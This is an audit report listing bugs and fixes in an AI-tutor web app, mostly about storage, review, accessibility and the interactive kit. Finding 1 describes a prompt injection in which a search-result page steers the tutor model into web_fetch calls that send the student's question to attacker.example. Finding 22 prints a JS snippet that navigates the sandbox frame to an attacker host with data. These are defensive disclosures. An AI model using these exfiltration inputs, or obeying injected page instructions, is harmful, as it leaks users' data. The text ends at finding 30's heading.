# Deep audit, round 3

Workflow deep-audit: eight specialist finders (generation, store, review, lesson, views, kit, security, accessibility and product rules) audited the code at commit 02e10bc. Each finding was then checked by two independent sceptics, one reproducing it and one tracing the code to refute it. 51 findings survived (1 blocker, 23 major, 27 minor). Full verdicts with repro output: audit-round3.json.

## 1. [blocker] web_fetch allow-list checks a regex-extracted prefix, not the URL actually sent, so crafted URLs reach any host (and real Wikipedia sources are refused)

- **Where:** `app/src/js/10-runtime.js:322` (lens: security, also generation)
- **Scenario:** This bypasses the fix in ce034f6 for the earlier security review's finding #1. The tutor conversation holds Dan's typed questions and has web_search and web_fetch. Suppose a page that ranks for the topic gets into the search results (or into the lesson's sources, which the tutor may open without searching), and its excerpt tells the model to open the page again with `)?q=<the student's question>` added. The model calls web_fetch with urls:["https://attacker.example/pendulum-facts)?q=I%20failed%20this..."]. `_urlsIn` (line 287) stops at `)` and checks only `https://attacker.example/pendulum-facts`, which is allowed. The connector then receives the full string and fetches the attacker's host with Dan's question in the query. A `\` works the same way. The guard also passes any entry that does not look like a URL to its regex, as long as one entry in the list is allowed. So ["https://www.nasa.gov/pendulum", "https:/attacker.example/log?q=SECRET"] (or a version with no scheme, or `//attacker...`) goes through after any normal search, with no attacker page needed in the results. The same mismatch breaks a common path in the other direction: a real source such as https://en.wikipedia.org/wiki/Pendulum_(mechanics) is cut to `...Pendulum_(mechanics`, so web_fetch is refused for it even when it is a search result or a lesson source.
- **Fix:** Validate and send the parsed URLs themselves, not substrings found by a regex. In the web_fetch branch:
```js
var list = input && Array.isArray(input.urls) ? input.urls : [], ok = [], bad = [];
list.forEach(function (u) { var x = null; try { x = new URL(String(u)); } catch (e) {}
  var n = x && /^https?:$/.test(x.protocol) && !x.username && !x.password ? U.research._norm(x.href) : null;
  if (n && allowed.has(n)) ok.push(x.href); else bad.push(String(u).slice(0, 120)); });
if (!list.length) return Promise.resolve('Tool error (bad_request): ...');
if (bad.length) return Promise.resolve('Tool error (refused): ... Not allowed: ' + bad.slice(0, 3).join(', '));
input = Object.assign({}, input, { urls: ok });
```
Add entries to `allowed` the same way: `_norm(new URL(u).href)` for each search-result url and each `opts.allow` entry. Parentheses then match on both sides, and only canonical, allowed addresses ever reach the connector.

## 2. [major] "Rebuild this lesson" pressed while the interactive is still building quietly reuses the running job: no new lesson is written and Dan's note is dropped

- **Where:** `app/src/js/31-generate.js:622` (lens: generation, also lesson)
- **Scenario:** The lesson text is saved as 'building' and the interactive is still being built (30 s to several minutes). At that point 50-lesson.js:243 (setDoc) already shows the "This looks wrong" footer, and flagSheet offers "Rebuild this lesson". Dan types "the slider makes thrust go down but the text says up" and taps Rebuild. startRelearn moves his progress to a new round (his prediction goes into past, stage goes back to predict) and calls U.gen.relearn. relearn finds the running ensureLesson job and returns that job's promise. When it settles, the same old lesson (same checks, same interactive) is shown as the "fresh lesson". The writer never sees his note and nothing is rebuilt. A second Rebuild during a relearn fails the same way.
- **Fix:** In relearn, do not join a running job. Wait for it to finish, then write the fresh lesson: `if (job) return job.promise.catch(noop).then(function () { return relearn(tid, iid, opts); });`. Also, in 50-lesson.js watchLesson, while st.again is set, adopt only a doc whose startedAt is later than the moment startRelearn ran. Otherwise the old job's 'building' doc is shown as the new lesson.

## 3. [major] Lesson results are never announced to a screen reader, and focus drops to <body> after most lesson actions

- **Where:** `app/src/js/50-lesson.js:813` (lens: a11y-rules, also lesson)
- **Scenario:** A screen-reader or keyboard user (TalkBack, NVDA) goes through a lesson. (1) Say it back: they type an answer and press 'Check my answer'. compose.hidden=true hides the focused button, so focus falls to <body>. The verdict ('Partly there' plus feedback) is appended with no live region, so nothing is ever spoken and they don't know they were graded. (2) 'I've had a play': U.clear(after) removes the focused button, focus goes to <body>, and the 'What happens' reveal is not announced. (3) 'Show me a model answer': same. (4) After Continue on each quick check, the next question appears but bring(host) only focuses '.lsn-h', and the card's heading is '.qc-q', so focus is lost and the new question is silent. The same happens when placing an item in an order card (pool rebuilt under focus, 41-cards.js:298-315), after 'Check my answer' on a review recall card (show(c, panel, null), 41-cards.js:653), and after the warm-up's 'Next question' (71-topic.js:385, its data-key no longer exists after render).
- **Fix:** Create one empty visually-hidden role=status element when the lesson screen opens and set its text for each result: the verdict plus 'nailed', 'What happens: ...', 'Model answer shown', and 'Question 2 of 3'. Then move focus to the new content. Give the verdict (and the reveal and model-answer callouts) tabindex=-1 and focus them. Make bring() look for '.lsn-h, .qc-q' so the next check's question gets focus. In 41-cards.js order draw(), refocus the next pool chip, or Check once every item is placed. In recall submit, focus the panel's h3. In 71-topic.js Next question, focus the next question's first option or the warm-up summary.

## 4. [major] The research quote check never verifies a fragment under 8 characters after an ellipsis, and accepts fragments in any order, so an invented number can pass as a checked quote

- **Where:** `app/src/js/31-generate.js:238` (lens: generation)
- **Scenario:** Research cites page P with the quote "The speed of sound in dry air at 20 °C is about … 400 m/s". The page actually says 343 metres per second. found() splits the quote on the ellipsis and drops "400 m s" because it is only 7 characters, finds the first fragment, and keeps the source. The topic Library and the lesson's source sheet then show the invented figure as an exact quote. The lesson writer is told this is one of "the only sources you may cite". Fragments stitched together out of order also pass. The research prompt forbids both ellipses and stitched fragments, but the check that is meant to catch a model breaking that rule lets both through.
- **Fix:** Check every non-empty fragment (no length filter) and require them in order: `var at = 0; return frags.length > 0 && frags.every(function (f) { var i = hay.indexOf(f, at); if (i < 0) return false; at = i + f.length; return true; });`. normText already turns "…" and "..." into spaces, so a quote copied from an excerpt that itself contains an ellipsis still matches. Update the matching sentence in ARCHITECTURE.md section 7.

## 5. [major] No check of sample.limits().tools and no handling of tools_unavailable: on a view that cannot run page tools, Ask Claude always fails with the platform's raw message and research is stored as failed

- **Where:** `app/src/js/31-generate.js:885` (lens: generation)
- **Scenario:** This only happens on a view where `sample.limits()` reports no `tools`. sample.d.ts says: "Only where limits reports tools — elsewhere the call rejects tools_unavailable … check limits first". Tool support on Dan's Android app was never verified; ARCHITECTURE.md lists only sample. If Parallel Search is connected on such a view, every Ask Claude question is sent with tools and rejects. Dan sees the platform's developer-facing message, because errText has no mapping for this code. Research rejects the same way and writes `research.status:'failed'` into the shared topic doc. The Library then says "The source check did not finish" and offers a retry that fails again, and every lesson re-triggers research once it is 10 minutes old.
- **Fix:** Before offering tools, check `U.rt.sample.limits ? U.rt.sample.limits().then(function (l) { return !!(l && l.tools); }) : false`, or treat a `tools_unavailable` rejection the same way. Tutor: send the call without tools (ctx.tools = false already selects the no-tools prompt text). Research: store 'unavailable', as when there is no connector, instead of 'failed'.

## 6. [major] Outbox re-sends a stale lesson patch over a lesson rewritten later, bypassing the lease: a finished lesson goes back to 'building' with the wrong text

- **Where:** `app/src/js/20-store.js:298` (lens: store)
- **Scenario:** On the phone, the lesson job saves {status:'building', lesson:L1} and the bridge is unavailable. The write is retried once, fails, and is held in the outbox. The job stops (31-generate.js stopped(): unavailable is transient, so the doc stays 'writing'). Because the phone's connection is bad, Dan opens the same idea on the laptop. Once the 90 s lease lapses, the laptop's job claims the doc with lesson.set, writes L2, builds interactive I2 and saves it 'ready'. Dan works through it there. When he next brings the phone app to the foreground, visibilitychange, online or any successful write calls flush(). That sends patchDoc(path, {}) with the held body, and it lands on the laptop's ready doc. The lesson he finished is now status 'building' with L1's text and L2's interactive. Its check ids now point at different questions, review target cards are skipped as 'later' and then retired, and the next open rebuilds an interactive for L1. The same happens on one device: tapping Try again claims the doc with lesson.set, whose success calls wrote() and then flush(), and the old 'building'+L1 patch lands on the new claim.
- **Fix:** Do not hold patches to shared lesson docs. The lesson job already owns its retries under the lease and by.holder. In patchDoc's keep(), `if (/^topics\/[^/]+\/lessons\//.test(path)) return false;`. Also make a full replace supersede older partial patches: in setDoc, `delete held[path];` before run(), as lesson.remove already does.

## 7. [major] Subscriptions die for good after ~3 s of a dead bridge; the topic page then freezes on 'Planning your topic' with no error

- **Where:** `app/src/js/20-store.js:335` (lens: store)
- **Scenario:** Dan creates a topic and the topic page shows 'Planning your topic'. The bridge stops answering for a few seconds, for example as the phone app resumes. The platform ends the live listeners with 'unavailable'. subscribe() resubscribes 3 times with 0.4/0.8/1.6 s backoff, all of which fail, then reports retrying:false and never tries again. Nothing restarts it on online, on visibilitychange or when writes recover. The topic view ignores that final error once it has loaded (71-topic.js:42 `if (loaded) return;`). The plan finishes in this page and is saved as ready, but the page shows 'Planning your topic' indefinitely, with no error and no Try again. The untilStuck timer was not armed because planning was running here, so it never turns into 'Planning stopped' either. The lesson screen's progress, topic and lesson watches (50-lesson.js:214, 226, 262), the topic page's progress watch (71-topic.js:46) and the profile watch (99-boot.js:57) pass no onError at all, so they also go stale silently. ARCHITECTURE section 3 says views show an error with Try again, never a frozen or empty state.
- **Fix:** In subscribe(), on 'unavailable' after the 3 quick tries, park the subscription instead of dropping it. Restart parked ones from the same places that flush the outbox (online, visibilitychange, wrote()), and keep a slow retry (for example every 30 s) running meanwhile. In 71-topic.js:42, when retrying is false after the page has loaded, show V.loadError (Try again) in a notice instead of returning silently.

## 8. [major] The outbox lives only in page memory although its toast says the work is 'kept here'; a finished idea whose cards write was lost never gets review cards

- **Where:** `app/src/js/20-store.js:122` (lens: store)
- **Scenario:** During an outage the toast says 'Your work could not be saved just now. It is kept here and saved as soon as the connection is back.' The held patches and later jobs, however, are plain in-memory variables (`var held = {}, later = []`). If Dan closes the app, Android kills it, or the page reloads before a flush succeeds, they are gone with no warning. That covers say-it-back text, check answers and review grades. The worst case is finishing a lesson: the progress write {stage:'done', doneAt} lands, then the addFromLesson cards patch fails and is held. If the app is closed, the idea is marked learned, but its review cards are never created. They cannot be recovered afterwards. On reopen, begin() calls addDone(false) for a done idea, and addFromLesson only runs when `first = live && !st.replay && !st.ip.doneAt` (50-lesson.js:988), so the idea never comes back in review.
- **Fix:** Mirror held patches into localStorage under a per-user key (for example `mu.outbox.<uid>`, path -> patch) whenever held changes, and replay them through patchDoc after U.rt.ready. Make card creation re-derivable: after addFromLesson succeeds, write a marker such as ideas[iid].cardsRound = round. When a done idea is opened without that marker for its round, call U.review.addFromLesson(tid, iid, lesson, outcome()) again; it is idempotent. Until that is done, word the toast so it does not promise the work survives closing the app.

## 9. [major] A Today flag set weeks ago rebuilds the lesson Dan opens to reread, wiping the original

- **Where:** `app/src/js/50-lesson.js:177` (lens: review)
- **Scenario:** An idea gets two Again grades, so Today (or the review summary) writes progress.ideas[iid].relearn = true (60-today.js:166-171). Dan doesn't take the offer and keeps reviewing the cards correctly. After 30 days the lapses age out and Today stops suggesting it. Later he opens the idea from the topic page, Map or Book just to reread it. The lesson screen sees the old flag and starts Learn it again on its own. The ready lesson's text and interactive are overwritten with {status:'writing', lesson:null}, a model call is spent, and the round number goes up. If that new lesson then fails for a non-transient reason, the doc is left 'failed' and the original lesson is gone for good. Nothing ever clears the flag except starting a relearn, and the lesson screen never checks whether the idea is still slipping.
- **Fix:** Act on the flag only while the idea is still slipping. At 50-lesson.js:177, when the trigger is st.ip.relearn and not params.again, call U.review.slipping() first. If {tid, iid} is not in the list, save {relearn:false} and open the lesson normally. Alternatively, have slippingNow clear relearn on flagged ideas that are no longer in its list.

## 10. [major] One more Again during an unfinished Learn it again re-flags the idea and throws that round away

- **Where:** `app/src/js/60-today.js:164` (lens: review)
- **Scenario:** Dan taps Learn it again (round 1, againAt = T). He works through part of the new lesson, say up to Explain, and leaves. The old round's cards stay in review until the new round is finished, and the ones he just failed are due tomorrow. The next day he gets one of them wrong again. slippingIn still counts the two lapses from before T, because the old cards' learnedAt is from round 0. The only guard is `againAt >= g.last`, and the newest lapse is after againAt, so the idea counts as slipping again. Today shows 'This idea has slipped a couple of times lately' and writes relearn:true. When Dan goes back to finish his half-done lesson, it restarts as round 2. The round-1 lesson is overwritten, his place in it is lost, and another lesson is generated. By the contract (two or more Again grades since the new round began) it should not count as slipping.
- **Fix:** Count only lapses after the current round began. Have slippingIn keep each group's lapse times (g.ats). In slippingNow, keep a group only if `g.ats.filter(a => !idea || !idea.againAt || a > idea.againAt).length >= LAPSE_LIMIT`. That replaces the `againAt >= g.last` test.

## 11. [major] A target card whose lesson isn't ready is counted every day but never shown, so the badge never clears

- **Where:** `app/src/js/60-today.js:514` (lens: review)
- **Scenario:** The idea's lesson doc is not 'ready'. This happens when a Learn it again or a 'This looks wrong' rebuild fails (status 'failed', lesson null) or is left part-way (status 'building'). plan() still counts the idea's due target card, so Today says 'N cards to revisit' and the badge shows N. In the session, lessonFor returns 'later' and the card is silently dropped without being saved or retired. If it is the only card due, Start review goes straight to the 'Review done' tick with 'Nothing was reviewed this time.' Back on Today it still says '1 card to revisit' and the badge still shows 1, every day, until Dan happens to reopen and finish that lesson. As the most overdue card, it also takes one of the daily cap's slots each day.
- **Fix:** In lessonFor, treat status 'failed' as 'retire': finishing the round's lesson un-retires an unchanged question in addFromLesson. For 'writing'/'building', move the card's due date to tomorrow with one U.store.cards.update(tid, id, c => ({ s: Object.assign({}, c.s, { due: U.addDays(U.today(), 1) }) })) so it stops counting today. Then refresh the badge after the session.

## 12. [major] A Learn it again whose rebuild fails is lost for good: the round is committed and relearn cleared before a fresh lesson exists, so the next visit replays the old lesson and Today stops offering it

- **Where:** `app/src/js/50-lesson.js:375` (lens: lesson)
- **Scenario:** Dan taps Today's "Learn it again" (#/t/tid/iid/again). startRelearn immediately saves {round: prev+1, stage:'predict', relearn:false, againAt: now, checks:null, doneAt:null}. Then the write fails for a passing reason (unavailable or rate_limited). 31-generate restores the old ready lesson doc, and the screen shows "Try again / Back to the topic". If he taps Back to the topic, or reopens the idea later:
- relearn is false, so line 177 does not restart the rebuild;
- the old ready lesson opens as the "new" round, with checks cleared and stage at predict;
- Today never lists the idea again, because 60-today.js:164 skips ideas whose againAt >= the last lapse.
He never gets the fresh lesson, and finishing the old one again keeps the old cards. The same happens if he reopens the idea before the relearn job has saved its 'writing' doc.
- **Fix:** Keep the request open until the fresh lesson exists. In startRelearn, write `relearn: true` instead of false. In settled(), just before `st.again = false`, add `if (st.again) saveIdea({ relearn: false });`. A failed or abandoned rebuild then restarts on the next open through the existing line 177.

## 13. [major] Resuming past Predict while the interactive is still building shows only the prep box: Dan can't reach the stage he was on, and a passing build failure blocks the lesson completely

- **Where:** `app/src/js/50-lesson.js:271` (lens: lesson)
- **Scenario:** While the interactive built, Dan used "Don't wait: read on while it builds" and got to Say it back (stage 'say' saved). He then left; on a phone the page is often killed. On reopening, the doc is still 'building' (or ensureLesson resumes the build, which takes 35-100 s). haveLesson() only calls begin() when `order(st.ip.stage) === 0`, so no stages are drawn:
- the whole lesson text is in hand but hidden;
- the bar says "Predict · 1 of 5" and every step is disabled;
- if the build then fails for a passing reason, he gets only "Try again" and cannot reach Explain, Say it back or the Checks at all.
On his first visit the same state let him read on.
- **Fix:** Line 271: `if (!st.begun) begin();`. begin() already resumes at the saved stage with earlier stages collapsed, and Play already shows the waiting panel with "Don't wait" when st.ready is false. settled() keeps its own `if (!st.begun) begin()` for the not-yet-begun case.

## 14. [major] A slow runtime at launch silently switches to an in-memory store: Dan's topics or progress look wiped, anything he does is lost, and the notice gives the wrong advice

- **Where:** `app/src/js/10-runtime.js:17` (lens: views)
- **Scenario:** Dan opens the app on a slow connection and claude.use('db') or user.id() answers after 10 s. guard() resolves null, so U.rt.db or U.rt.uid stays null for the whole visit, and the real namespace is dropped when it arrives. If db was slow, Learn shows the first-run welcome as if every topic were gone. If user was slow, every topic reads '0 of N done', Today has nothing due, and lessons he finishes write progress, say-it-back answers and cards to U.memdb. All of that is lost when he closes the app. The only signal is the notice 'Open this in the Claude app to keep your progress.', but he is already in the Claude app.
- **Fix:** In use() and the user.id() step, keep the original promise after the guard times out. When it later resolves, set U.rt[name] (or U.rt.uid) and U.emit('rt-late'). In 99-boot, on 'rt-late': remove #persist-notice, run loadPrefs() again, call U._route() and refresh the badge. Record which capabilities timed out (for example U.rt.late = ['db']) so persistNotice can say 'Your saved work is still loading. What you do now may not be kept until it appears.' instead of telling him to open the Claude app.

## 15. [major] On a phone, toasts render underneath open bottom sheets, so the backup's success or failure is never seen

- **Where:** `app/src/css/10-base.css:228` (lens: views)
- **Scenario:** In the phone layout Dan opens Settings and taps 'Save a backup'. The button shows 'Preparing…' and then goes back to 'Save a backup'. The result toast ('Backup saved.', 'Could not make the backup: …', or 'Saving files is not available here.') is drawn behind the bottom sheet, which covers the bottom of the screen where toasts sit. A failed backup looks the same as a successful one. Store outage toasts raised while any sheet is open, such as Ask Claude, are hidden the same way. In the laptop layout the toast sits under the scrim, dimmed.
- **Fix:** Raise .toasts above sheets (z-index: 75). While a bottom sheet is open, move toasts out of its way: `html.sheet-open:not([data-layout="laptop"]) .toasts { bottom: auto; top: calc(12px + env(safe-area-inset-top, 0px)); }`. #toasts sits outside #app, so it stays live while #app is inert.

## 16. [major] Map idea dots skip the in-app link router, because an SVG <a> always has a truthy .target

- **Where:** `app/src/js/99-boot.js:106` (lens: views)
- **Scenario:** Boot's capture-phase handler sends in-app '#/…' links through U.go, so a viewer that handles link clicks itself cannot break navigation (ARCHITECTURE §10, tested in layout.spec). Map dots are SVG <a> elements built by V.s('a'). For SVG anchors, a.target is an SVGAnimatedString object, which is always truthy, so `if (!a || a.target) return;` lets every dot tap through unrouted. Wherever the viewer cancels link clicks, or the frame refuses fragment changes, tapping an idea on the Map does nothing. Topic headers on the same screen are HTML links and still work.
- **Fix:** Test the attribute rather than the property: `if (!a || a.hasAttribute('target')) return;`. Optionally, register the listener in start() instead of after U.rt.ready, and stash the hash until boot finishes, so tab taps during 'Opening your university…' are routed too.

## 17. [major] Self-test passes pages that show NaN, Infinity or undefined anywhere except a readout or a K.plot, and K.fmt quietly turns NaN into a dash

- **Where:** `app/kit/kit.js:335` (lens: kit)
- **Scenario:** A body's formula breaks at part of a slider's range (the most common model bug), and the say sentence or an SVG label prints the result. Example: K.model((p) => ({ eff: Math.sqrt(p.a - 0.6) * 100 })) with K.update setting #say to 'Efficiency is ' + o.eff.toFixed(1) + '% here.' The opening screen reads 'Efficiency is NaN% here.' U.sandbox.test still returns ok:true at 340, 720 and 1040 px, so Dan sees it. The same happens with an SVG label 'Infinity turns' plus circle cx=Infinity, with 'The answer is undefined metres.', and with K.fmt(NaN), which prints 'It lands — m away.'. KIT.md:170 promises the self-test 'fails on an exception, NaN or Infinity'.
- **Fix:** 1) In run(), while `sink` is set, also flag `typeof v === 'number' && !isFinite(v)` outputs ('the model returned NaN for "eff"'). 2) In K.fmt, call problem('K.fmt was given NaN') for a non-finite value before returning '—'. 3) In the sweep's look(), scan document.body.innerText and SVG <text> for /\bNaN\b|\bundefined\b|\[object |(^|[^A-Za-z])-?Infinity\b/ and report the snippet with the current setting.

## 18. [major] A page whose only controls Dan can't reach passes: controls inside .k-after-move, or K.anim with no into:

- **Where:** `app/kit/kit.js:1757` (lens: kit)
- **Scenario:** Case 1: a body wraps its controls panel in the reveal-after-move class (<div class="k-after-move"><div class="k-controls" id="c">…). The self-test reveals after-move parts while it sweeps, so it passes. Live, the slider has visibility:hidden, so it can't be seen, tapped or focused. K.moved never becomes true and the hidden answers never appear: the interactive is dead. Case 2: K.anim({label:'Drop the ball', step}) without `into` puts no Play button anywhere. The self-test plays the animation itself and passes, but Dan can never start it.
- **Fix:** In attachedProblems, which runs after the sweep has hidden the after-move parts again, report any control or K.button where `!el.getClientRects().length || getComputedStyle(el).visibility !== 'visible'`, e.g. 'control "a" is hidden when the page opens (inside .k-after-move or a hidden element), so Dan cannot move it'. Also report `anims.forEach(a => { if (a.api.el.firstChild && !a.api.el.isConnected) … 'K.anim "Drop the ball" has no into:, so its Play button is not on the page' })`.

## 19. [major] Sound started from K.update passes the self-test; live, every slider change starts another overlapping tone or 20-second hum

- **Where:** `app/kit/kit.js:1493` (lens: kit)
- **Scenario:** A body plays sound as the slider moves: K.update((p) => K.sound.tone(p.f, {dur: 1})), or K.sound.hold(p.f) in K.update instead of hold() from a button plus set(). The self-test reports ok:true. Its only signal is the load-time warning 'asked to play before Dan pressed anything', and 33-interactive.js returns a passing page without a repair, so warnings never reach the model. Once Dan touches the page, every change starts a new voice. A finger drag starts about one per animation frame, so dozens of tones stack up and their sum clips. With hold(), each change starts a 20-second hum. KIT.md:101 promises 'It is quiet and plays only after Dan presses something'.
- **Fix:** In sweep(), record audio.calls before and after the control steps (the per-control loop and the all-lowest and all-highest steps). If it rose, call problem('K.sound played when a control moved (from K.update): play sound only from a K.button press; to follow a slider, start K.sound.hold from a button and call its set() in K.update'). Optionally, have hold() stop the previous hold it started.

## 20. [major] K.color ignores var(--k-…), which KIT.md recommends, and CSS colour names: plot lines come out in the wrong colour, the legend disagrees, fills turn black

- **Where:** `app/kit/kit.js:150` (lens: kit)
- **Scenario:** KIT.md:126 says 'Use these roles as var(--k-…) or K.color('fill2')'. A body draws a plot with series [{fn, label:'Safe'}, {fn, label:'Danger', color:'var(--k-warn)'}]. The canvas rejects that strokeStyle, so 'Danger' is drawn in the previous series' navy, while its HTML legend key resolves the variable and shows red. Dan sees a key that says the danger line is red and two navy lines. regions/shade with color:'var(--k-fill3)' fill black, and K.color('var(--k-fill2)', 0.3) returns 'rgba(0, 0, 0, 0.3)'. No warning appears. CSS names that KIT.md itself uses to describe roles also pass through unchanged: color:'navy' is #000080 on the dark page (about 1.0:1 contrast, invisible) and never follows the theme.
- **Fix:** In K.color, map /^var\(\s*--k-([a-z0-9-]+)\s*\)$/ to that role (then camelCase it), and warn for any bare word that is not a role, without the CSS.supports exemption. Make rgbaOf return null when the canvas rejects the colour: assign two different sentinels and compare, or check that fillStyle changed.

## 21. [major] K.stage squashes a custom canvas (or img) on a phone: it caps the height but keeps width:100%, so circles become ellipses

- **Where:** `app/kit/kit.js:1335` (lens: kit)
- **Scenario:** At phone width (340 px frame) a body draws a simulation on <canvas width=680 height=800> with three controls and calls K.stage('#cv', '#c'). The stage is taller than 600 px, so fitStage sets the canvas max-height to 234px. .k-fig keeps width:100% (294 px), so the bitmap is stretched to a 1.257 aspect instead of 0.85. The circle it draws appears as a wide ellipse (wrong geometry in a learning figure). The self-test passes. SVG letterboxes and K.plot redraws at the new height, so only canvas and img visuals distort. KIT.md:122 recommends K.stage on every page.
- **Fix:** For a non-plot canvas or img in fitStage, also set `f.el.style.width = 'auto'` so the width follows the aspect ratio under max-width:100% and max-height, and clear it in the reset at the top of fitStage. Alternatively set `f.el.style.objectFit = 'contain'`.

## 22. [major] An interactive escapes its CSP by navigating its own frame, and the page it lands on stays mounted in the lesson by posting `ready`

- **Where:** `app/src/js/32-sandbox.js:238` (lens: security)
- **Scenario:** The srcdoc CSP blocks fetch, images and similar requests, and the file header says it 'blocks all network requests'. It does not cover the frame navigating itself. A model-written body (one written from prompt-injected research, for example) can wait until Dan interacts, then run `var a=document.createElement('a'); a.href='https://attacker.example/frame.html?d='+data; document.body.appendChild(a); a.click();`. The kit's static scan (kit.js:1754) does not look for this, and the hidden self-test cannot see actions that happen later. The navigation request goes out carrying the data. The host's away-guard (lines 237-244) resets `readyCount` on the second load and then waits 3 s for a `ready` message. The landing page simply posts `{src:'kit',type:'ready'}` after its own load. The host then keeps it as the lesson's interactive indefinitely. That page is remote, has no CSP of its own and can be changed by its owner at any time, so it can draw any UI inside the lesson card and send whatever Dan types into it to its server. Whether the claude.ai viewer's own CSP stops this in production is not observable from here; the app itself does nothing to stop it.
- **Fix:** 1. Add `<meta http-equiv="Content-Security-Policy" content="frame-src 'none'">` as the first line of app/src/head.html. The parent's frame-src governs every navigation of its child frames, and srcdoc frames are unaffected (verified in the harness). Check once in the claude.ai viewer that the runtime bridge still works.
2. In mount's `load` handler, treat any load after the first as leaving the kit: call `report(...)` and `api.destroy()` at once, and do not let a `ready` from the new document rescue it. The page that arrived can claim anything. I found no code that re-parents a mounted frame; if one exists, re-set `srcdoc` there instead.
3. Correct the header comment, which says the CSP blocks all network requests from the frame.

## 23. [major] Ask Claude's live log re-reads the whole reply on every streamed chunk and the whole conversation on every question

- **Where:** `app/src/js/51-tutor.js:124` (lens: a11y-rules)
- **Scenario:** A screen-reader user asks Claude a question in the lesson. The log is role=log aria-live=polite. While the reply streams, refresh() calls fill(), which runs U.clear(el) and re-appends the full text so far once per animation frame. Each re-append is a new 'addition' that the screen reader queues, so the reply is spoken from the start again and again ('Good question. Gravity pulls just…', 'Good question. Gravity pulls just as hard…', and so on). Sending a second question calls draw(), which clears the log and re-adds every earlier message, so the whole conversation is read out again before the new answer.
- **Fix:** Remove aria-live and role=log from .tutor-log. Add a separate visually-hidden role=status that says 'Claude is answering…' when a question is sent and receives the finished reply text once, when notify(..., finished) fires. In send() and retry(), append only the new message nodes instead of calling draw(). During streaming, update a single text node in place rather than clearing and re-adding the bubble.

## 24. [major] 'In one breath', the hook and the warm-up answers are written before research, never checked, and shown unlabelled next to 'Sources checked'

- **Where:** `app/src/js/71-topic.js:256` (lens: a11y-rules)
- **Scenario:** Every topic page shows the planner's oneBreath in the amber 'remember this' callout ('In one breath'). It also shows the hook and two warm-up questions that rule 'Right.' or 'Not quite. The answer is …' with a 'why'. All of this comes from plan-topic, which runs from model memory before research starts. Research never revisits or checks it. The same page's Library says 'Sources checked · 4 sources', and the Learn card shows a 'Sources checked' badge, so unsourced summary claims look checked. On a contested topic, the oneBreath can state as settled what the lessons later teach as contested.
- **Fix:** Label plan-level text as what it is. Add a quiet line under 'In one breath' and under the warm-up reveal: 'Claude's overview from what it already knows; each lesson checks the details against sources.' Better: have the research step return a checked oneBreath and checked calibration answers (or flag disagreements) and show the label only while they are unchecked. Keep 'Sources checked' wording scoped to the lessons ('Lessons checked against N sources').

## 25. [minor] An automatic retry of a research call reuses the first attempt's tool set, so the retry starts with the search budget and failure count already used up

- **Where:** `app/src/js/10-runtime.js:129` (lens: generation)
- **Scenario:** Research uses 9 of its 10 searches, then the call fails with upstream_error (likely on a call that runs for minutes). U.ask retries the whole call after 1-3 s with the same `o.tools`. The retry is a fresh, memory-less model with no earlier results. It gets one search, then "Tool error (budget): … Write your answer from what you already have". So research comes back near-empty and the topic's lessons are written unsourced. The `failed` counter carries over the same way, so after free-tier rate limits the retry can be told "the search service is not answering" before it makes a single call. The truncated-JSON retry hits the same exhausted budget.
- **Fix:** Smallest fix: do not auto-retry upstream_error for calls that carry tools (`attempt < 1 && !o.tools`). research() already records 'failed', and lessons re-run it later with a fresh tool set. Alternative: rebuild or reset the tool set's budget and failure counters before the retry.

## 26. [minor] U.parseJson reads from the first '{' or '[' in the whole multi-round text of a tool call, so a bracket in earlier narration breaks a valid research reply

- **Where:** `app/src/js/10-runtime.js:34` (lens: generation)
- **Scenario:** When research runs with tools, sample() resolves "the text of every round, a blank line between rounds" (sample.d.ts). If any narration before the final JSON contains a bracket, the parse goes wrong:
- "…spring tides happen at new and full moon [1]. Let me fetch it." makes parseJson return the array [1]. The research validator rejects it, and the whole research prompt plus that text is resent (another paid default-tier call, with tools).
- "{objective: …}" in the narration gives bad_json, with the same retry.
A second bad reply marks research failed, so the topic's lessons go unsourced. The platform's sample.json avoids this by parsing only the final message.
- **Fix:** In parseJson, when the whole text does not parse, try each '{' or '[' start in turn and return the last complete value that parses, which is the final round's answer. Or, when a schema expects an object, accept only an object. Or use sample.json for json calls that carry tools.

## 27. [minor] Two tabs in one browser overwrite each other's study minutes

- **Where:** `app/src/js/20-store.js:491` (lens: store)
- **Scenario:** U.device() comes from localStorage 'mu.device', so every tab of the same browser shares one device id. Each page keeps its own in-memory running total (mine[day]), read from the db only on its first log of the day, and writes it as the absolute value days[day][deviceId]. Dan studies 10 min in tab A, switches to tab B for 4 min (B reads 10 and writes 14), then goes back to tab A for 2 min. A writes its stale 10 + 2 = 12, and B's 4 minutes disappear from 'this week'.
- **Fix:** Key the counter by page, not by browser: use `var dev = U.device() + '.' + PAGE_ID` (a per-page-load id) in U.logStudy. minutesOn() already sums every key in days[day], so the totals stay correct and no tab overwrites another's count.

## 28. [minor] A reading setting changed while the app is still opening is lost (sent to memory or to an invalid db path), then reverted

- **Where:** `app/src/js/74-settings.js:51` (lens: store)
- **Scenario:** The Aa button is wired in start() (99-boot.js:87) before U.rt.ready resolves, which can take seconds on a phone. If Dan bumps the text size while 'Opening your university…' shows, U.store.profile.patch computes its path at call time with U.rt.uid still null, giving 'local/me/profile' (20-store.js:68). If ready resolves within the 120 ms coalescing window, D() now picks the real db for that 3-segment path. It throws a TypeError, and Dan sees the toast 'Could not save just now: document path needs an even number of segments (got 3): local/me/profile'. Otherwise the change goes to the in-memory db. In both cases nothing reaches his profile, and loadPrefs (99-boot.js:47-48) then applies the db prefs, undoing the size he just chose.
- **Fix:** Defer private writes until the runtime is known. In U.settings.set use `var saved = U.rt.ready.then(function () { return U.store.profile.patch(patch); })`, or more generally have patchDoc/setDoc for S.paths.profile/progress/cards resolve the path inside `U.rt.ready.then(...)`.

## 29. [minor] 'This looks wrong' notes are erased whenever the lesson is rewritten

- **Where:** `app/src/js/31-generate.js:716` (lens: store)
- **Scenario:** Dan flags a lesson twice ('the slider says faster but the text says slower', then 'source 2 is a shop page'). Each note is stored in lessons/{iid}.flags, which the contract says keeps the newest 30. He then taps Rebuild, or later Learn it again, or a failed lesson is retried. write() claims the doc with U.store.lesson.set, a full replace whose body has no flags. All earlier notes are deleted; only the latest one survives, inside `feedback`. The backup, the only place these notes appear, then shows none of them.
- **Fix:** Carry the notes across the rewrite. In write(), add `flags: (o.prev && o.prev.flags) || null` to the lesson.set body; o.prev is already the doc read before the claim. Also have restore() keep them, which it already does since it sets prev whole.

## 30. [minor] Closing review while a recall grade is pending leaves the badge and Today showing that card as still due

- **Where:** `app/src/js/60-today.js:632` (lens: review)
